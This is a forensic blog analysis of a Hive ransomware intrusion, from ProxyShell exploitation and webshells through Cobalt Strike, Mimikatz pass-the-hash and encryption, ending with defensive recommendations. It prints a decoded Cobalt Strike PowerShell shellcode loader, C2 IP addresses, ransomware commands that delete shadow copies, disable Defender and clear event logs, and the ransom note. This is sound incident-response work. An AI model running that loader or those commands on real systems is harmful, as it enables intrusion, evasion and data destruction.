    "plain_text": "# Hive Ransomware Analysis\n\n**varonis.com/blog/hive-ransomware-analysis**\n\nDuring a recent engagement with a customer, the Varonis Forensics Team investigated a ransomware incident. Multiple devices and\nfile servers were compromised and encrypted by a malicious threat group known as Hive.\n\nFirst observed in June 2021, Hive is an affiliate-based ransomware variant used by cybercriminals to conduct ransomware attacks\nagainst healthcare facilities, nonprofits, retailers, energy providers, and other sectors worldwide. Hive is built for distribution in a\n[Ransomware-as-a-service model that enables affiliates to utilize it as desired.](https://www.varonis.com/blog/ransomware-as-a-service?hsLang=en)\n\nThe variant uses common ransomware tactics, techniques, and procedures (TTPs) to compromise victims' devices. While taking\nlive actions, the operator disables anti-malware protections and then exfiltrates sensitive data and encrypts business files. Their\naffiliates use multiple mechanisms to compromise their victims' networks, including phishing emails with malicious attachments,\nleaked VPN credentials, and by exploiting vulnerabilities on external-facing assets. In addition, Hive places a plain-text ransom note\nthat threatens to publish the victim's data on the TOR website 'HiveLeaks' unless the victim meets the attacker's conditions.\n\n\n-----\n\n## Observation of the attack\n\nThe Forensics team observed that the actor managed to achieve its malicious goals and encrypt the environment in less than 72\nhours from the initial compromise.\n\n### Stage 1: ProxyShell and WebShell\n\nFirst, the attacker exploited multiple Exchange security vulnerabilities, referred to as ProxyShell. Next, the attack placed a malicious\nbackdoor script, referred to as webshell, in a publicly accessible directory on the Exchange server. These web scripts could then\nexecute malicious PowerShell code over the compromised server with SYSTEM privileges.\n\n### Stage 2: Cobalt Strike\n\nThe malicious PowerShell code downloaded additional stagers from a remote C2 (Command & Control) server associated with the\nCobalt Strike framework. The stagers were not written to the file system but executed in memory.\n\n### Stage 3: Mimikatz and Pass-The-Hash\n\nLeveraging the SYSTEM permissions, the threat actor created a new system administrator user named \"user\" and advanced to the\n[credential dumping stage, invoking Mimikatz. By stealing the domain Administrator NTLM hash and without needing to crack the](https://www.varonis.com/blog/what-is-mimikatz?hsLang=en)\npassword, the operator managed to reuse it via Pass-The-Hash attack and take control of the domain admin account.\n\n### Stage 4: Scanning for sensitive information\n\nNext, the threat actor performed extensive discovery activities across the network. In addition to searching for files containing\n\"password\" in their names, observed activities included dropping network scanners and collecting the networks' IP addresses and\ndevice names, followed by RDPs to the backup servers and other critical assets.\n\n### Stage 5: Ransomware deployment\n\nFinally, a custom-crafted malware payload named Windows.exe was delivered and executed on various devices, leading to wide\nencryption and denial of access to files within the organization.\n\nThe payload created a plain text ransomware demand note during the encryption phase.\n\n## Initial Access\n\nThe initial indicator of compromise was the successful exploitation of Microsoft Exchange via vulnerabilities known as ProxyShell.\n\nRevealed in August 2021, ProxyShell is a Remote Code Execution (RCE) vulnerability. ProxyShell involves a set of three separate\nsecurity flaws and allows remote attackers to execute arbitrary code on affected installations of Microsoft Exchange Server.\n\n### CVE-2021-34473 (Base Score: 9.8)\n\nMicrosoft Exchange Server Remote Code Execution Vulnerability.\n\n### CVE-2021-34523 (Base Score: 9.8)\n\nMicrosoft Exchange Server Elevation of Privilege Vulnerability\n\n### CVE-2021-31207 (Base Score: 7.2)\n\nMicrosoft Exchange Server Security Feature Bypass Vulnerability\n\nMicrosoft released patches for those three vulnerabilities in April and May 2021 as part of their \"Patch Tuesday\" releases. CVE2021-34473 and CVE-2021-34523 were patched (KB5001779) In April 2021. CVE-2021-31207 was patched (KB5003435) in May.\n\nDuring the investigation, we found specific exploitation evidence of these CVEs (Common Vulnerabilities and Exposures), which\nallowed the adversary to deploy webshells successfully on the compromised server.\n\nBased on our analysis four different IP addresses accessed the malicious files:\n\n\n-----\n\n### 139.60.161.228 (USA)\n\nASN: HOSTKEY\n\nRELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning\n\n### 139.60.161.56 (USA)\n\nASN: HOSTKEY\n\nRELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning\n\n### 185.70.184.8 (Netherlands)\n\nASN: HOSTKEY\n\nRELATED ACTIVITY: Cobalt Strike C2 and Log4j vulnerability scanning. Associated with Emotet, IcedID, and QBot.\n\n### 91.208.52.149 (Netherlands)\n\nASN: SERVERIUS-A\n\nThe following malicious files were spotted:\n\nThese file names are made of random characters that do not appear to have any significance. Attackers commonly use this\ntechnique to prevent third parties from finding the webshells online by sending HTTP requests to a list of preconstructed names that\nare part of other campaigns.\n\nThe source code of the established webshells is taken from a public git repository at\n[https://github.com/ThePacketBender/webshells.](https://github.com/ThePacketBender/webshells)\n\n\n-----\n\n## Execution\n\nBy establishing a foothold on the compromised Exchange Server, the threat actor executed various PowerShell commands\ndesigned to download malicious files from the remote C2 server to the victim's computer. Attackers would execute the malware by\nusing commands such as Invoke-Expression (IEX) or by downloading the file content directly into the device's memory and\nexecuting it:\n\nFurther, attackers executed an additional obfuscated PowerShell script that was a part of the Cobalt Strike framework:\n\nThe Base64 encoded command contains several layers of encoding but finally decodes to the following PowerShell command:\n\n\n-----\n\n```\nfunction func_get_proc_address {\n     Param ($var_module, $var_procedure)\n     $var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache\n-And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\n     $var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]]\n@('System.Runtime.InteropServices.HandleRef', 'string'))\n     return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object\nSystem.Runtime.InteropServices.HandleRef((New-Object IntPtr),\n($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))\n}\nfunction func_get_delegate_type {\n     Param (\n          [Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,\n          [Parameter(Position = 1)] [Type] $var_return_type = [Void]\n     )\n     $var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object\nSystem.Reflection.AssemblyName('ReflectedDelegate')),\n[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule',\n$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n     $var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public',\n[System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')\n     $var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type,\n$var_parameters).SetImplementationFlags('Runtime, Managed')\n     return $var_type_builder.CreateType()\n}\n[Byte[]]$var_code =\n[System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIv\nfor ($x = 0; $x -lt $var_code.Count; $x++) {\n     $var_code[$x] = $var_code[$x] -bxor 35\n}\nWrite-Output $var_code\n\n```\nThe additional \"for loop\" function adds another layer of obfuscation and XORs the Base64 code with a key of 35. We successfully\nextracted the IP address of the target C2 by mimicking the process, which, unsurprisingly, turned out to be the same address we\nfound previously.\n\n\n-----\n\nConverting the Base64 into a hexadecimal string and reformatting with a Python script restored the malicious file. VirusTotal\nanalysis shows 23 out of 52 antivirus detections and attributes the file to the Cobalt Strike framework.\n\n## Persistence\n\nWith the provided NT AUTHORITY\\SYSTEM privileges and to maintain persistence over the compromised server, a newly crafted\naccount followed by the name \"user\" was created and added to \"Remote Desktop Users\" and \"Administrators\" groups. The user\nwas used to access multiple paths seeking \"password\" related files, RDP access to backup servers, and more.\n\n## Credential Access\n\nThe threat actor used Mimikatz, a post-exploitation tool, specifically its SekurLSA's \"logonPasswords\" module, which extracts the\npasswords and NTLM hashes of the accounts logged into the system and saves the results to a text file on the local system. With\nthe administrator's NTLM hash in hand, the threat actor used the pass-the-hash technique to get highly privileged access to other\nassets in the network by launching a new command prompt on the affected system:\n\n## Lateral Movement\n\nLeveraging the stolen domain admin account, the actor performed RDP access requests using mstsc.exe following the parameter\n\"/v\" to multiple devices on the network, mainly searching for servers associated with the network backups and SQL servers. We\nstrongly believe that these actions were performed to confirm the ability to access the critical servers before the ransomware\n\n\n-----\n\ndeployment.\n\n## Discovery\n\nA known public network scanner tool named \"SoftPerfect\" was used to perform scans over the domain assets.\n\nBy utilizing the tool, the threat actor acquired the domain devices list and saved the results to a text file named \"domains.txt.\" To\nlocate all live hosts, the attacker executed a Batch script called \"p.bat,\" which looped over the domains list sending pings and saved\nthe results to a text file named \"res.txt.\"\n\n\n-----\n\nThe p.bat script and file naming convention match part of Conti s ransomware toolkit, which was provided to the group s affiliates\n[and first leaked on August 21, 2022 and published on Twitter. This indicates that Hive affiliates are adopting other ransomware](https://twitter.com/vxunderground/status/1423336151860002816?s=20)\ngroup techniques.\n\n## Impact\n\nThe threat actors began their final actions by distributing a file named \"windows.exe,\" which was the ransomware payload written in\nGolang. The payload performs multiple operations, including deleting shadow copies, disabling security products, clearing Windows\nevent logs, and closing handles on files to guarantee a smooth encryption process. Below is a brief documentation of the executed\ncommands:\n\n**Command** **Description**\n\nvssadmin.exe delete shadows /all /quiet Deleting the shadow copies from the machine to\ninhibit system recovery\n\nnet.exe stop \"SamSs\" /y Stops the Security Accounts Manager to prevent\nsending alerts to SIEM system\n\n\nreg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v\n\"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f\n\n\nDisables Windows Defender to avoid detection\n\n\nwevtutil.exe cl security Clearing the Windows Security Event Logs\n\nThe ransomware iterates through all the available folders encrypting the included files and drops a ransom note named\n\"_HOW_TO_DECRYPT.txt\" in each folder. Once it has finished encryption, it pops the ransom note to inform the user of the attack.\n```\nYour network has been breached and all data were encrypted.\nPersonal data, financial reports and important documents are ready to disclose.\nTo decrypt all the data and to prevent exfiltrated files to be disclosed at \nhttp://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd.onion/\nyou will need to purchase our decryption software.\nPlease contact our sales department at:\n  http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd.onion/\n   Login:  \n   Password: \nTo get an access to .onion websites download and install Tor Browser at:\n  https://www.torproject.org/ (Tor Browser is not related to us)\nFollow the guidelines below to avoid losing your data:\n - Do not modify, rename or delete *.key. files.

The impact of an attack can be detrimental. It may potentially harm an organization's reputation, disrupt regular\noperations and lead to temporary, and possibly permanent, loss of sensitive data.\n\nAlthough detecting and responding to such incidents can be challenging, most malicious activities can be prevented by having the\nright security tools, incident response plans, and patches for known vulnerabilities in place.\n\n\n-----\n\n## Recommendations\n\nVaronis Forensics Team recommends the following:\n\n[Patch Exchange server to the latest Exchange Cumulative Update (CU) and Security Update (SU) provided by Microsoft.](https://techcommunity.microsoft.com/t5/exchange-team-blog/proxyshell-vulnerabilities-and-your-exchange-server/ba-p/2684705)\nEnforce the use of complex passwords and require users to change passwords periodically.\nUse the [Microsoft LAPS solution to revoke local admin permissions from domain accounts (the principle of least privilege) and](https://www.microsoft.com/en-us/download/details.aspx?id=46899)\nregularly check for and remove inactive user accounts.\n[Block SMBv1 usage and use SMB signing to protect against pass-the-hash attack.](https://techcommunity.microsoft.com/t5/storage-at-microsoft/stop-using-smb1/ba-p/425858)\nRestrict access to the minimum required for the employee's role.\nDetect and automatically prevent access control changes that violate your business rules.\nTrain employees in security principles and make sure employees receive security awareness training as a part of your cyber\nsecurity plans.\nEstablish basic security practices, and set rules of behavior describing how to handle and protect the organization and\ncustomer information and other vital data.\n\n## MITRE Breakdown\n\n### 1.
